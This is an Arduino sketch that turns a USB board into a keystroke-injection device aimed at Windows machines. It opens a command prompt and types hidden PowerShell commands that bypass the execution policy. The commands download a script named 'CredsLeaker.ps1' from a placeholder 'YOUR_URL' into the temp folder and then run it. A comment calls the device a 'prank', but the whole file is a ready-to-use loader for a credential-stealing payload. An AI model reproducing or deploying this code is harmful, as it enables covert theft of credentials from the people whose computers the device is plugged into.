 #include "Keyboard.h"  
 char winKey = KEY_LEFT_GUI;  
 void setup() {  
  // we only need a keyboard for this prank...  
  Keyboard.begin();  
 }  
 void loop() {  
  delay(2000);  
  Keyboard.press(KEY_LEFT_GUI);  
  Keyboard.press('r');  
  delay(500);  
  Keyboard.releaseAll();  
  delay(500);  
  Keyboard.print("cmd");  
  delay(300);  
  Keyboard.press(KEY_RETURN);  
  Keyboard.releaseAll();
  delay(300);  
  Keyboard.print("powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass \"Invoke-RestMethod -uri \"YOUR_URL/CredsLeaker.ps1\" -OutFile %TEMP%\cl.ps1\""); 
  delay(200);  
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();  
  delay(200);
  Keyboard.print("powershell -NoP -Windowstyle hidden -noninteractive -Exec Bypass -file %TEMP%\cl.ps1 -mode \"dynamic\"");
  delay(200);  
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();     
  // wait forever...   
  while (true);  
 }  
